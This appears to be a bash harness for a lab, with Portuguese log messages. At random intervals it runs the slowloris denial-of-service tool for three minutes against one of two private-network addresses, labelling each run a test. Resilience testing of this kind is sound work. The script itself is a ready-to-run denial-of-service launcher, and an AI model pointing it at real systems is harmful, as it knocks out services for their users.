#!/bin/bash
declare -a TARGET_IPS=("192.168.1.10" "192.168.1.11")
declare -a TARGET_PORTS=("8000" "8001")

while true; do
  RANGE=630
  MIN_TIME=30
  RANDOM_TIME=$((($RANDOM % $RANGE) + $MIN_TIME))

  echo "[SLOWLORIS] Próximo teste em $RANDOM_TIME segundos."
  sleep $RANDOM_TIME

  NUM_TARGETS=${#TARGET_IPS[@]}
  RANDOM_INDEX=$(($RANDOM % $NUM_TARGETS))
  TARGET_IP=${TARGET_IPS[$RANDOM_INDEX]}
  TARGET_PORT=${TARGET_PORTS[$RANDOM_INDEX]}

  # O slowloris estará no PATH global
  timeout 180s slowloris -p "$TARGET_PORT" "$TARGET_IP"

  echo "[SLOWLORIS] Teste em $TARGET_IP:$TARGET_PORT concluído."
  echo "-----------------------------------"
done
